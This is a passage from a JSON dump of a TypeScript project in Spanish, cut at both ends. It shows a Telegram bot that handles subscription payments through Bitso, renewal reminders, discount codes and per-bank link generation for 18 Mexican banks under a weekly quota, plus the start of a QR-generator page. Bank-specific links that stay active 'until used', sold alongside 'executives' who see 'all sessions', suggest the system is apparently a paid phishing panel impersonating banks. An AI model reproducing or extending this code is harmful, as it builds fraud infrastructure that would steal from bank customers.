Gestiona hasta 8 ejecutivos\n Cada ejecutivo con acceso independiente\n Visibilidad completa de todas las sesiones` \n      : '';\n\n    const message = ` *Instrucciones de Pago*\n\nHola *${user.username?.replace(/[_*[\\]()~`>#+=|{}.!-]/g, '\\\\$&')}*,\n\n${contextMessage}${accountTypeInfo}\n\n *Monto a depositar:* $${expectedAmount} MXN\n\n *Instrucciones:*\n1锔 Abre tu app bancaria\n2锔 Deposita exactamente *$${expectedAmount} MXN*\n3锔 Usa la siguiente cuenta receptora:\n   \\`${BITSO_RECEIVING_ACCOUNT}\\`\n\n憋 *Verificaci贸n Autom谩tica:*\n Env铆a tu captura de pantalla del pago\n El sistema verificar谩 tu pago con Bitso cada 2 minutos\n Recibir谩s confirmaci贸n autom谩tica (puede tomar hasta 30 min)\n Si no se verifica, el admin revisar谩 manualmente\n\n *Siguiente paso:*\nEnv铆a la captura de pantalla de tu transferencia\n\nPara cancelar este proceso, env铆a /cancelar`;\n\n    await bot.sendMessage(user.telegramChatId, message, { \n      parse_mode: 'Markdown',\n      disable_web_page_preview: true \n    });\n\n    console.log(`[Bot] Instrucciones de pago enviadas a ${user.username} (contexto: ${context})`);\n  } catch (error: any) {\n    console.error(`[Bot] Error enviando instrucciones de pago a ${user.username}:`, error);\n  }\n}\n\n/**\n * Env铆a recordatorios de renovaci贸n a usuarios cuyas suscripciones expiran en 1 d铆a\n */\nexport async function sendRenewalReminders(): Promise<void> {\n  try {\n    console.log('[Bot] Verificando usuarios con suscripciones por vencer...');\n    \n    // Obtener usuarios que expiran en 24 horas\n    const usersExpiringTomorrow = await storage.getUsersExpiringTomorrow();\n    \n    if (usersExpiringTomorrow.length === 0) {\n      console.log('[Bot] No hay usuarios con suscripciones por vencer');\n      return;\n    }\n\n    console.log(`[Bot] Enviando recordatorios a ${usersExpiringTomorrow.length} usuarios`);\n\n    for (const user of usersExpiringTomorrow) {\n      if (!user.telegramChatId) {\n        console.log(`[Bot] Usuario ${user.username} no tiene Chat ID configurado`);\n        continue;\n      }\n\n      const expirationDate = user.expiresAt ? new Date(user.expiresAt).toLocaleDateString('es-ES') : 'ma帽ana';\n      \n      try {\n        // Enviar instrucciones de pago\n        await sendPaymentInstructions(user, 'renewal');\n        \n        console.log(`[Bot] Recordatorio de pago enviado a ${user.username} (${user.telegramChatId})`);\n        \n        // Crear notificaci贸n en el sistema\n        await storage.createNotification({\n          userId: user.id,\n          type: 'subscription_reminder',\n          title: 'Realiza tu pago',\n          message: `Tu suscripci贸n expira el ${expirationDate}. Realiza tu pago y env铆a la captura de pantalla para renovar autom谩ticamente.`,\n          priority: 'high'\n        });\n        \n      } catch (error) {\n        console.error(`[Bot] Error enviando recordatorio a ${user.username}:`, error);\n      }\n      \n      // Peque帽a pausa entre env铆os para evitar rate limiting\n      await new Promise(resolve => setTimeout(resolve, 1000));\n    }\n    \n  } catch (error) {\n    console.error('[Bot] Error en recordatorios de renovaci贸n:', error);\n  }\n}\n\n// Ejecutar recordatorios diariamente a las 10:00 AM\nconst scheduleRenewalReminders = () => {\n  const now = new Date();\n  const targetTime = new Date();\n  targetTime.setHours(10, 0, 0, 0); // 10:00 AM\n  \n  // Si ya pas贸 la hora de hoy, programar para ma帽ana\n  if (now > targetTime) {\n    targetTime.setDate(targetTime.getDate() + 1);\n  }\n  \n  const timeUntilTarget = targetTime.getTime() - now.getTime();\n  \n  setTimeout(() => {\n    sendRenewalReminders();\n    // Programar para ejecutar cada 24 horas\n    setInterval(sendRenewalReminders, 24 * 60 * 60 * 1000);\n  }, timeUntilTarget);\n  \n  console.log(` Recordatorios programados para las 10:00 AM (pr贸xima ejecuci贸n: ${targetTime.toLocaleString('es-ES')})`);\n};\n\n// Iniciar programaci贸n de recordatorios\nscheduleRenewalReminders();\n\n/**\n * Env铆a notificaci贸n cuando se renueva un panel\n */\nexport async function sendRenewalConfirmation(userId: number, newExpirationDate: Date): Promise<void> {\n  try {\n    const user = await storage.getUserById(userId);\n    if (!user || !user.telegramChatId) {\n      console.log(`[Bot] Usuario ${userId} no tiene Chat ID configurado para confirmaci贸n de renovaci贸n`);\n      return;\n    }\n\n    const expirationDateStr = newExpirationDate.toLocaleDateString('es-ES');\n    \n    const message = ` *PANEL RENOVADO EXITOSAMENTE*\n\n 隆Tu suscripci贸n ha sido renovada!\n\n **Nueva fecha de expiraci贸n:** ${expirationDateStr}\n **Usuario:** ${user.username}\n **Estado:** Activo\n\n Ahora puedes continuar utilizando todos los servicios del panel.\n\n隆Gracias por renovar con nosotros! \n\n_Confirmaci贸n autom谩tica del sistema_`;\n\n    await bot.sendMessage(user.telegramChatId, message, { \n      parse_mode: 'Markdown',\n      disable_web_page_preview: true \n    });\n    \n    console.log(`[Bot] Confirmaci贸n de renovaci贸n enviada a ${user.username} (${user.telegramChatId})`);\n    \n    // Crear notificaci贸n en el sistema\n    await storage.createNotification({\n      userId: user.id,\n      type: 'subscription_renewed',\n      title: 'Panel Renovado',\n      message: `Tu suscripci贸n ha sido renovada hasta el ${expirationDateStr}`,\n      priority: 'medium'\n    });\n    \n  } catch (error) {\n    console.error('[Bot] Error enviando confirmaci贸n de renovaci贸n:', error);\n  }\n}\n\n/**\n * Env铆a notificaci贸n cuando vence un panel\n */\nexport async function sendExpirationNotification(userId: number): Promise<void> {\n  try {\n    const user = await storage.getUserById(userId);\n    if (!user || !user.telegramChatId) {\n      console.log(`[Bot] Usuario ${userId} no tiene Chat ID configurado para notificaci贸n de vencimiento`);\n      return;\n    }\n\n    const message = `锔 *PANEL VENCIDO*\n\n Tu suscripci贸n al panel ha expirado\n\n **Usuario:** ${user.username}\n **Fecha de vencimiento:** Hoy\n **Estado:** Inactivo\n\n **Para reactivar tu cuenta:**\n Contacta con @balonxSistema\n Renueva tu suscripci贸n para restablecer el acceso\n\n No pierdas m谩s tiempo, 隆renueva ahora!\n\n_Notificaci贸n autom谩tica del sistema_`;\n\n    await bot.sendMessage(user.telegramChatId, message, { \n      parse_mode: 'Markdown',\n      disable_web_page_preview: true \n    });\n    \n    console.log(`[Bot] Notificaci贸n de vencimiento enviada a ${user.username} (${user.telegramChatId})`);\n    \n    // Crear notificaci贸n en el sistema\n    await storage.createNotification({\n      userId: user.id,\n      type: 'subscription_expired',\n      title: 'Panel Vencido',\n      message: 'Tu suscripci贸n ha expirado. Contacta @balonxSistema para renovar.',\n      priority: 'high',\n      actionUrl: 'https://t.me/balonxSistema'\n    });\n    \n  } catch (error) {\n    console.error('[Bot] Error enviando notificaci贸n de vencimiento:', error);\n  }\n}\n\n/**\n * Verifica y notifica paneles vencidos\n */\nexport async function checkAndNotifyExpiredPanels(): Promise<void> {\n  try {\n    console.log('[Bot] Verificando paneles reci茅n vencidos...');\n    \n    const expiredUsers = await storage.getRecentlyExpiredUsers();\n    \n    if (expiredUsers.length === 0) {\n      console.log('[Bot] No hay paneles reci茅n vencidos');\n      return;\n    }\n\n    console.log(`[Bot] Enviando notificaciones de vencimiento a ${expiredUsers.length} usuarios`);\n\n    for (const user of expiredUsers) {\n      await sendExpirationNotification(user.id);\n      \n      // Peque帽a pausa entre env铆os\n      await new Promise(resolve => setTimeout(resolve, 1000));\n    }\n    \n  } catch (error) {\n    console.error('[Bot] Error verificando paneles vencidos:', error);\n  }\n}\n\n// Ejecutar verificaci贸n de vencimientos cada hora\nsetInterval(checkAndNotifyExpiredPanels, 60 * 60 * 1000);\nconsole.log(' Verificaci贸n de vencimientos programada cada hora');\n\n/**\n * Env铆a confirmaci贸n de pago cuando se verifica un dep贸sito\n */\nexport async function sendPaymentConfirmation(userId: number, amount: string, expirationDate: Date): Promise<void> {\n  try {\n    const user = await storage.getUserById(userId);\n    if (!user || !user.telegramChatId) {\n      console.log(`[Bot] Usuario ${userId} no tiene Chat ID configurado para confirmaci贸n de pago`);\n      return;\n    }\n\n    const expirationDateStr = expirationDate.toLocaleDateString('es-ES');\n    \n    const message = ` *PAGO VERIFICADO*\n\n 隆Tu pago ha sido confirmado!\n\n **Monto:** $${amount}\n **Suscripci贸n activa hasta:** ${expirationDateStr}\n **Usuario:** ${user.username}\n\n Tu cuenta ha sido activada autom谩ticamente por 7 d铆as.\n\n隆Gracias por tu pago! Ahora puedes disfrutar de todos los servicios del panel.\n\n_Confirmaci贸n autom谩tica del sistema Bitso_`;\n\n    await bot.sendMessage(user.telegramChatId, message, { \n      parse_mode: 'Markdown',\n      disable_web_page_preview: true \n    });\n    \n    console.log(`[Bot] Confirmaci贸n de pago enviada a ${user.username} (${user.telegramChatId})`);\n    \n    await storage.createNotification({\n      userId: user.id,\n      type: 'subscription_renewed',\n      title: 'Pago Verificado',\n      message: `Tu pago de $${amount} ha sido confirmado. Cuenta activa hasta el ${expirationDateStr}`,\n      priority: 'high'\n    });\n    \n  } catch (error) {\n    console.error('[Bot] Error enviando confirmaci贸n de pago:', error);\n  }\n}\n\n/**\n * Env铆a solicitud de verificaci贸n manual al admin cuando Bitso no puede verificar el pago\n */\nexport async function sendManualVerificationRequest(paymentId: number, user: any, amount: string, telegramFileId: string): Promise<void> {\n  try {\n    const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;\n    if (!ADMIN_CHAT_ID) {\n      console.error('[Bot] ADMIN_CHAT_ID no configurado');\n      return;\n    }\n\n    // Obtener la imagen para an谩lisis de IA\n    const file = await bot.getFile(telegramFileId);\n    const imageUrl = `https://api.telegram.org/file/bot${process.env.TELEGRAM_TOKEN}/${file.file_path}`;\n    const imageResponse = await axios.get(imageUrl, { responseType: 'arraybuffer' });\n    const imageBase64 = Buffer.from(imageResponse.data).toString('base64');\n\n    // Analizar con IA\n    const { verifyPaymentScreenshot } = await import('./paymentVerificationAI');\n    const aiAnalysis = await verifyPaymentScreenshot(imageBase64, amount, user.username || 'Usuario');\n\n    // Enviar al admin con an谩lisis de IA\n    const caption = `锔 *VERIFICACIN MANUAL REQUERIDA*\n\n Usuario: *${user.username}*\n Monto esperado: *$${amount} MXN*\n Bitso API no pudo verificar el pago despu茅s de 30 minutos\n\n *An谩lisis de IA:*\n${aiAnalysis.isValid ? '' : ''} V谩lido: ${aiAnalysis.isValid ? 'S铆' : 'No'}\n Monto detectado: ${aiAnalysis.extractedAmount ? `$${aiAnalysis.extractedAmount} MXN` : 'No detectado'}\n Hora detectada: ${aiAnalysis.extractedTime || 'No detectada'}\n Confianza: ${(aiAnalysis.confidence * 100).toFixed(0)}%\n Raz贸n: ${aiAnalysis.reason}\n\n *Acci贸n requerida:*\nRevisa manualmente la captura y activa al usuario si el pago es correcto.\n\nID de Pago: ${paymentId}`;\n\n    await bot.sendPhoto(ADMIN_CHAT_ID, telegramFileId, {\n      caption,\n      parse_mode: 'Markdown'\n    });\n\n    console.log(`[Bot] Solicitud de verificaci贸n manual enviada al admin para usuario ${user.username}`);\n\n    // Notificar al usuario\n    if (user.telegramChatId) {\n      await bot.sendMessage(user.telegramChatId, ` *Verificaci贸n en Proceso*\n\nTu pago est谩 siendo revisado manualmente por el administrador.\n\nRecibir谩s confirmaci贸n pronto.\n\n Si tienes dudas, contacta: @balonxSistema`, {\n        parse_mode: 'Markdown'\n      });\n    }\n\n  } catch (error) {\n    console.error('[Bot] Error enviando solicitud de verificaci贸n manual:', error);\n  }\n}\n\n/**\n * Responde a consultas sobre pagos con IA simple\n */\nexport function handlePaymentQuery(message: string): string {\n  const lowerMessage = message.toLowerCase();\n  \n  if (lowerMessage.includes('pagar') || lowerMessage.includes('depositar') || lowerMessage.includes('como pago')) {\n    return ` *Instrucciones de Pago*\n\nPara activar tu suscripci贸n por 7 d铆as:\n\n1锔 Realiza un dep贸sito a trav茅s de Bitso\n2锔 Usa el monto exacto que te indic贸 el administrador\n3锔 El sistema verificar谩 tu pago autom谩ticamente\n4锔 Recibir谩s confirmaci贸n aqu铆 mismo\n\n锔 *Importante:*\n El pago se verifica en minutos\n Tu cuenta se activa autom谩ticamente\n Recibir谩s recordatorio 1 d铆a antes de vencer\n\n Dudas: @balonxSistema`;\n  }\n  \n  if (lowerMessage.includes('cuanto') || lowerMessage.includes('precio') || lowerMessage.includes('costo')) {\n    return ` *Informaci贸n de Precio*\n\nEl precio de la suscripci贸n por 7 d铆as te lo proporcionar谩 el administrador.\n\nPara conocer el monto exacto, contacta:\n @balonxSistema\n\nEl pago se realiza a trav茅s de Bitso y se verifica autom谩ticamente.`;\n  }\n  \n  if (lowerMessage.includes('cuenta') || lowerMessage.includes('deposito') || lowerMessage.includes('donde')) {\n    return ` *Informaci贸n de Cuenta*\n\nPor seguridad, los datos de la cuenta de dep贸sito NO se comparten p煤blicamente.\n\nPara obtener los detalles de pago:\n Contacta con @balonxSistema\n\nEl administrador te proporcionar谩:\n Monto a depositar\n Detalles de la cuenta\n Instrucciones espec铆ficas`;\n  }\n  \n  if (lowerMessage.includes('verificar') || lowerMessage.includes('confirmar') || lowerMessage.includes('cuando')) {\n    return `憋 *Verificaci贸n de Pagos*\n\nEl sistema verifica pagos autom谩ticamente cada 5 minutos.\n\nUna vez que realices tu dep贸sito:\n Se verificar谩 autom谩ticamente\n Recibir谩s confirmaci贸n aqu铆\n Tu cuenta se activar谩 por 7 d铆as\n\nSi no recibes confirmaci贸n en 30 minutos:\n Contacta @balonxSistema`;\n  }\n  \n  if (lowerMessage.includes('renovar') || lowerMessage.includes('vence') || lowerMessage.includes('expira')) {\n    return ` *Renovaci贸n de Suscripci贸n*\n\nRecibir谩s un recordatorio 1 d铆a antes de que venza tu suscripci贸n.\n\nPara renovar:\n1锔 Contacta @balonxSistema\n2锔 Realiza el pago como la primera vez\n3锔 Se activar谩 autom谩ticamente por 7 d铆as m谩s\n\n隆No pierdas acceso a tus servicios! `;\n  }\n  \n  return ` Hola, soy el bot de pagos.\n\nPuedo ayudarte con:\n Informaci贸n de pagos\n Precios y costos\n憋 Verificaci贸n de dep贸sitos\n Renovaciones\n\nPara soporte personalizado:\n @balonxSistema`;\n}\n\n// Agregar manejador de mensajes para respuestas autom谩ticas y flujo de pago\nif (bot) {\n  bot.on('message', async (msg) => {\n  const chatId = msg.chat.id.toString();\n  const messageText = msg.text || '';\n  \n  // Ignorar comandos (ya se manejan en onText)\n  if (messageText.startsWith('/')) {\n    return;\n  }\n  \n  // Verificar si hay una sesi贸n de generaci贸n de enlaces activa\n  const linkSession = linkGenerationSessions.get(chatId);\n  \n  if (linkSession && linkSession.state === 'awaiting_bank_selection') {\n    try {\n      // Mapeo de bancos\n      const BANK_NAMES: Record<string, string> = {\n        liverpool: ' Liverpool',\n        citibanamex: ' Citibanamex',\n        banbajio: ' BanBaj铆o',\n        bbva: ' BBVA',\n        banorte: ' Banorte',\n        bancoppel: ' BanCoppel',\n        hsbc: ' HSBC',\n        amex: ' American Express',\n        santander: ' Santander',\n        scotiabank: ' Scotiabank',\n        invex: ' Invex',\n        banregio: ' Banregio',\n        spin: ' SPIN',\n        platacard: ' Platacard',\n        bancoazteca: ' Banco Azteca',\n        bienestar: ' Banco del Bienestar',\n        inbursa: ' Inbursa',\n        afirme: ' Afirme'\n      };\n      \n      let selectedBank: string | null = null;\n      \n      // Verificar si es un n煤mero (铆ndice)\n      const indexMatch = messageText.match(/^(\\d+)$/);\n      if (indexMatch) {\n        const index = parseInt(indexMatch[1]) - 1;\n        if (index >= 0 && index < linkSession.allowedBanks.length) {\n          selectedBank = linkSession.allowedBanks[index];\n        }\n      } else {\n        // Buscar por nombre del banco (case insensitive)\n        const searchText = messageText.toLowerCase().trim();\n        selectedBank = linkSession.allowedBanks.find(bank => {\n          const bankName = BANK_NAMES[bank] || bank;\n          return bank.toLowerCase() === searchText || \n                 bankName.toLowerCase().includes(searchText) ||\n                 searchText.includes(bank.toLowerCase());\n        }) || null;\n      }\n      \n      if (!selectedBank) {\n        await bot.sendMessage(chatId, ` Banco no v谩lido.\n\nPor favor selecciona un banco de la lista enviando:\n El n煤mero (ejemplo: \\`1\\`)\n El nombre del banco (ejemplo: \\`Liverpool\\`)\n\nPara cancelar, env铆a /cancelar`, {\n          parse_mode: 'Markdown'\n        });\n        return;\n      }\n      \n      // Enviar mensaje de \"generando...\"\n      const processingMsg = await bot.sendMessage(chatId, ' Generando enlace, por favor espera...', {\n        parse_mode: 'Markdown'\n      });\n      \n      // Generar el enlace usando linkTokenService\n      const { linkTokenService } = await import('./services/linkToken');\n      const linkResult = await linkTokenService.createLink({\n        userId: linkSession.userId,\n        bankCode: selectedBank,\n        metadata: { source: 'telegram' }\n      });\n      \n      // Eliminar mensaje de \"generando...\"\n      await bot.deleteMessage(chatId, processingMsg.message_id);\n      \n      // Obtener cuota actualizada despu茅s de generar el enlace\n      const updatedQuota = await linkQuotaService.getCurrentUsage(linkSession.userId);\n      \n      const bankName = BANK_NAMES[selectedBank] || selectedBank.toUpperCase();\n      const successMessage = ` *Enlace Generado Exitosamente*\n\n${bankName}\n Usuario: *${linkSession.username}*\n\n *Tu enlace:*\n${linkResult.originalUrl}\n\n *V谩lido hasta:* ${new Date(linkResult.expiresAt).toLocaleString('es-MX')}\n\n *Cuota semanal:* ${updatedQuota.count} / ${updatedQuota.limit} enlaces usados\n *Enlaces restantes:* ${updatedQuota.remaining}\n\n El enlace se puede ver en tu panel y estar谩 activo hasta que sea usado o cancelado manualmente.\n\nPara generar otro enlace, usa /generar`;\n      \n      await bot.sendMessage(chatId, successMessage, {\n        parse_mode: 'Markdown',\n        disable_web_page_preview: true\n      });\n      \n      console.log(`[Telegram Bot] Enlace generado para ${linkSession.username}: ${selectedBank} - ${linkResult.originalUrl}`);\n      \n      // Nota: linkTokenService.createLink() ya incrementa la cuota autom谩ticamente\n      \n      // Limpiar sesi贸n\n      cleanupLinkSession(chatId);\n      \n    } catch (error: any) {\n      console.error('[Telegram Bot] Error generando enlace:', error);\n      \n      let errorMessage = ' Ocurri贸 un error al generar el enlace.';\n      \n      if (error.message && error.message.includes('l铆mite semanal')) {\n        errorMessage = `锔 *L铆mite de Enlaces Alcanzado*\n\n${error.message}\n\nEl l铆mite se renueva cada lunes.\n\n Puedes ver tus enlaces disponibles en el panel.`;\n      }\n      \n      await bot.sendMessage(chatId, errorMessage, {\n        parse_mode: 'Markdown'\n      });\n      \n      // Limpiar sesi贸n\n      cleanupLinkSession(chatId);\n    }\n    \n    return;\n  }\n  \n  // Verificar si hay una sesi贸n de descuento activa (solo admin)\n  const discountSession = discountSessions.get(chatId);\n  \n  if (discountSession && chatId === ADMIN_CHAT_ID) {\n    if (discountSession.state === 'awaiting_amount') {\n      // Esperar monto del descuento\n      const amountMatch = messageText.match(/^[\\d.]+$/);\n      \n      if (!amountMatch) {\n        await bot.sendMessage(chatId, ` Por favor env铆a solo el *monto de descuento* (n煤meros), ejemplo: 500\n\nPara cancelar, env铆a /cancelar`, { \n          parse_mode: 'Markdown' \n        });\n        return;\n      }\n      \n      const discountAmount = parseFloat(messageText).toFixed(2);\n      \n      try {\n        // Generar c贸digo 煤nico alfanum茅rico de 8 caracteres\n        const code = generatePaymentReferenceCode(); // Reutilizamos la funci贸n que genera c贸digos 煤nicos\n        \n        // Buscar al admin que crea el c贸digo\n        const admins = await storage.getAllUsers();\n        const admin = admins.find(u => u.telegramChatId === chatId);\n        \n        if (!admin) {\n          await bot.sendMessage(chatId, ' Error: No se pudo identificar tu cuenta de administrador.', { \n            parse_mode: 'Markdown' \n          });\n          discountSessions.delete(chatId);\n          return;\n        }\n        \n        // Crear c贸digo de descuento\n        const discountCode = await storage.createDiscountCode({\n          code,\n          discountAmount,\n          createdBy: admin.id\n        });\n        \n        const message = ` *C贸digo de Descuento Creado*\n\n C贸digo: \\`${code}\\`\n Descuento: $${discountAmount} MXN\n Creado: ${new Date().toLocaleString('es-MX')}\n\nEste c贸digo es de un solo uso. Comp谩rtelo con el cliente para que lo use al registrarse.\n\nEl precio base es $3000 MXN. Con este descuento el precio final ser谩: *$${(3000 - parseFloat(discountAmount)).toFixed(2)} MXN*`;\n\n        await bot.sendMessage(chatId, message, { \n          parse_mode: 'Markdown' \n        });\n        \n        // Limpiar sesi贸n\n        discountSessions.delete(chatId);\n        \n      } catch (error: any) {\n        console.error('[DiscountCode] Error creando c贸digo:', error);\n        await bot.sendMessage(chatId, ' Ocurri贸 un error al crear el c贸digo de descuento. Intenta nuevamente.', { \n          parse_mode: 'Markdown' \n        });\n        discountSessions.delete(chatId);\n      }\n      \n      return;\n    }\n  }\n  \n  // Verificar si hay una sesi贸n de pago activa\n  const paymentSession = paymentSessions.get(chatId);\n  \n  if (paymentSession) {\n    // Procesar flujo de pago\n    if (paymentSession.state === 'awaiting_screenshot') {\n      // Esperar imagen/foto\n      if (msg.photo && msg.photo.length > 0) {\n        const photo = msg.photo[msg.photo.length - 1]; // Obtener la foto de mayor calidad\n        paymentSession.screenshotFileId = photo.file_id;\n        \n        // Cambiar estado para esperar la cantidad\n        paymentSession.state = 'awaiting_amount';\n        \n        await bot.sendMessage(chatId, ` *Captura recibida correctamente*\n\nAhora ingresa la *cantidad exacta* que depositaste (solo n煤meros):\n\nEjemplo: 3000 o 2500.50\n\nPara cancelar, env铆a /cancelar`, { \n          parse_mode: 'Markdown' \n        });\n        \n        return;\n      } else {\n        await bot.sendMessage(chatId, ` Por favor env铆a una *imagen* (captura de pantalla) de tu transferencia.\n\nPara cancelar, env铆a /cancelar`, { \n          parse_mode: 'Markdown' \n        });\n        return;\n      }\n    }\n    \n    if (paymentSession.state === 'awaiting_amount') {\n      // Esperar monto\n      const amountMatch = messageText.match(/[\\d.]+/);\n      \n      if (!amountMatch) {\n        await bot.sendMessage(chatId, ` Por favor env铆a solo el *monto* (n煤meros), ejemplo: 3000 o 2500.50\n\nPara cancelar, env铆a /cancelar`, { \n          parse_mode: 'Markdown' \n        });\n        return;\n      }\n      \n      const amount = parseFloat(amountMatch[0]).toFixed(2);\n      paymentSession.amount = amount;\n      \n      // Crear pending payment para verificaci贸n autom谩tica con Bitso + AI\n      try {\n        const user = await storage.getUserById(paymentSession.userId!);\n        \n        if (!user) {\n          throw new Error('Usuario no encontrado');\n        }\n\n        // Generar c贸digo de referencia 煤nico para este pago\n        const referenceCode = generatePaymentReferenceCode();\n\n        // Obtener balance actual de Bitso antes de crear el pago\n        const currentBalance = await getMXNBalance();\n        console.log(`[Payment] Balance actual de Bitso: $${currentBalance || 'N/A'} MXN`);\n\n        // Crear pending payment para verificaci贸n autom谩tica\n        const expiresAt = new Date();\n        expiresAt.setHours(expiresAt.getHours() + 1); // Expira en 1 hora\n\n        await storage.createPayment({\n          userId: user.id,\n          amount: amount,\n          referenceCode,\n          status: 'pending' as any,\n          telegramFileId: paymentSession.screenshotFileId!,\n          verificationAttempts: 0,\n          expiresAt,\n          previousBalance: currentBalance || undefined,\n          reportedAmount: amount\n        });\n\n        console.log(`[Payment] Pending payment creado para usuario ${user.username} - C贸digo: ${referenceCode} - Monto: $${amount} MXN`);\n\n        // Determinar si es activaci贸n o renovaci贸n\n        const isActive = user.isActive && user.expiresAt && new Date(user.expiresAt) > new Date();\n        const actionText = isActive ? 'renovaremos' : 'activaremos';\n        \n        // Enviar comprobante al nuevo bot de pagos\n        sendPaymentReceipt({\n          username: user.username,\n          amount: amount,\n          referenceCode: referenceCode,\n          status: 'pending',\n          userId: user.id\n        }).catch(err => console.error('[PaymentBot] Error enviando comprobante:', err));\n        \n        // Notificar al usuario\n        await bot.sendMessage(chatId, ` *Estamos procesando tu transferencia*\n\nCuando sea exitosa te *${actionText}* tu cuenta autom谩ticamente.\n\n *C贸digo de Referencia:* \\`${referenceCode}\\`\n *Monto:* $${amount} MXN\n\n憋 Si en 15 minutos no se puede verificar autom谩ticamente, tu caso ser谩 enviado al administrador para activaci贸n manual.\n\n Recibir谩s una notificaci贸n cuando tu cuenta sea activada.`, { \n          parse_mode: 'Markdown' \n        });\n\n        // Notificar al admin que hay un nuevo pago pendiente\n        await bot.sendPhoto(ADMIN_CHAT_ID, paymentSession.screenshotFileId!, {\n          caption: ` *Nuevo Pago Pendiente - Verificaci贸n Autom谩tica*\n\n Usuario: *${user.username}*\n Monto reportado: *$${amount} MXN*\n Monto esperado: *$${paymentSession.expectedAmount} MXN*\n C贸digo: \\`${referenceCode}\\`\n\n *Verificaci贸n Autom谩tica:*\n Bitso API + AI Vision cada 2 minutos\n Auto-${actionText} si se verifica exitosamente\n Revisi贸n manual despu茅s de 15 minutos\n\n Fecha: ${new Date().toLocaleString('es-MX')}`,\n          parse_mode: 'Markdown'\n        });\n        \n        // Limpiar sesi贸n\n        paymentSessions.delete(chatId);\n        \n      } catch (error: any) {\n        console.error(' Error procesando pago:', error);\n        await bot.sendMessage(chatId, ' Ocurri贸 un error al procesar tu solicitud. Por favor contacta con @BalonxSistema', { \n          parse_mode: 'Markdown' \n        });\n        paymentSessions.delete(chatId);\n      }\n      \n      return;\n    }\n  }\n  \n  // Respuestas autom谩ticas para consultas sobre pagos (solo si no hay sesi贸n activa)\n  if (messageText.toLowerCase().includes('pago') || \n      messageText.toLowerCase().includes('pagar') ||\n      messageText.toLowerCase().includes('precio') ||\n      messageText.toLowerCase().includes('cuenta') ||\n      messageText.toLowerCase().includes('deposito') ||\n      messageText.toLowerCase().includes('verificar') ||\n      messageText.toLowerCase().includes('renovar')) {\n    \n    const response = handlePaymentQuery(messageText);\n    await bot.sendMessage(chatId, response, { \n      parse_mode: 'Markdown',\n      disable_web_page_preview: true \n    });\n  }\n  });\n}","size_bytes":65953},"client/src/pages/QRGeneratorPage.tsx":{"content":"import React, { useState } from 'react';\nimport { Card, CardContent, CardHeader, CardTitle } from \"@/components/ui/card\";\nimport { Label } from \"@/components/ui/label\";\nimport { Input } from \"@/components/ui/input\";\nimport { Button } from \"@/components/ui/button\";\nimport { QrCode, Download, Copy, RefreshCw } from \"lucide-react\";\nimport { useToast } from \"@/hooks/use-toast\";\n\nexport function QRGeneratorPage() {\n  const [inputText, setInputText] = useState('');\n  const [qrImageUrl, setQrImageUrl] = useState('');\n  const [isGenerating, setIsGenerating] = useState(false);\n  const { toast } = useToast();\n\n  // Funci贸n para validar que el input sea alfanum茅rico\n  const validateInput = (input: string) => {\n    // Permite letras, n煤meros y espacios\n    return /^[a-zA-Z0-9\\s]*$/.test(input);\n  };\n\n  // Funci贸n para generar el c贸digo QR\n  const generateQR = () => {\n    if (!inputText) {\n      toast({\n        title: \"Error al generar QR\",\n        description: \"Debes ingresar un texto alfanum茅rico para generar el c贸digo QR\",\n        variant: \"destructive\",\n      });\n      return;\n    }\n\n    setIsGenerating(true);\n    \n    try {\n      // Usar la API de QR Code Generator\n      const url = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(inputText)}`;\n      setQrImageUrl(url);\n      \n      toast({\n        title: \"QR generado\",\n        description: \"El c贸digo QR se ha generado correctamente\",\n      });\n    } catch (error) {\n      console.error(\"Error generando QR:\", error);\n      toast({\n        title: \"Error al generar QR\",\n        description: \"Ocurri贸 un error al generar el c贸digo QR\",\n        variant: \"destructive\",\n      });\n    } finally {\n      setIsGenerating(false);\n    }\n  };\n\n  // Funci贸n para descargar el c贸digo QR como imagen\n  const downloadQR = () => {\n    if (!qrImageUrl) return;\n    \n    fetch(qrImageUrl)\n      .then(response => response.blob())\n      .then(blob => {\n        const url = window.URL.createObjectURL(blob);\n        const link = document.createElement('a');\n        link.href = url;\n        link.download = `qr-code-${inputText}.png`;\n        document.body.appendChild(link);\n        link.click();\n        window.URL.revokeObjectURL(url);\n        document.body.removeChild(link);\n        \n        toast({\n          title: \"QR descargado\",\n          description: \"El c贸digo QR se ha descargado correctamente\",\n        });\n      })\n      .catch(error => {\n        console.error(\"Error descargando QR:\", error);\n        toast({\n          title: \"Error al descargar\",\n          description: \"No se pudo descargar el c贸digo QR\",\n          variant: \"destructive\",\n        });\n      });\n  };\n\n  // Funci贸n para copiar el texto del QR al portapapeles\n  const copyQRText = () => {\n    navigator.clipboard.writeText(inputText)\n      .then(() => {\n        toast({\n          title: \"Texto copiado\",\n          description: \"El c贸digo ha sido copiado al portapapeles\",\n        });\n      })\n      .catch((error) => {\n        console.error(\"Error copiando al portapapeles:\", error);\n        toast({\n          title: \"Error al copiar\",\n          description: \"No se pudo copiar el texto al portapapeles\",\n          variant: \"destructive\",\n        });\n      });\n  };\n\n  // Manejar cambios en el input\n  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {\n    const value = e.target.value;\n    \n    // Solo permitir caracteres alfanum茅ricos y espacios\n    if (validateInput(value)) {\n      setInputText(value);\n    }\n  };\n\n  return (\n    <div className=\"bg-[#121212] min-h-screen flex flex-col\">\n      <div className=\"flex items-center justify-between p-4 bg-[#1a1a1a] border-b border-gray-800\">\n        <h1 className=\"text-xl md:text-2xl font-bold text-white\">\n          <QrCode className=\"inline-block mr-2 h-6 w-6\" />\n          Generador de C贸digos QR\n        </h1>\n        \n        <a href=\"/admin\" className=\"text-blue-400 hover:text-blue-300 text-sm\">\n          &larr; Volver al panel de administraci贸n\n        </a>\n      </div>\n      \n      <div className=\"flex-1 p-4 md:p-6\">\n        <Card className=\"bg-[#1e1e1e] text-white border-gray-700 max-w-4xl mx-auto\">\n          <CardHeader>\n            <CardTitle className=\"flex items-center\">\n              <QrCode className=\"mr-2 h-5 w-5\" />\n              Generador de C贸digos QR\n            </CardTitle>\n          </CardHeader>\n          <CardContent>\n            <div className=\"grid gap-6\">\n              <div className=\"grid grid-cols-1 md:grid-cols-3 gap-4\">\n                <div className=\"col-span-1 space-y-4\">\n                  <div className=\"space-y-2\">\n                    <Label htmlFor=\"qr-input\">Ingresa texto alfanum茅rico</Label>\n                    <Input\n                      id=\"qr-input\"\n                      type=\"text\"\n                      value={inputText}\n                      onChange={handleInputChange}\n                      placeholder=\"Ej: ABC123\"\n                      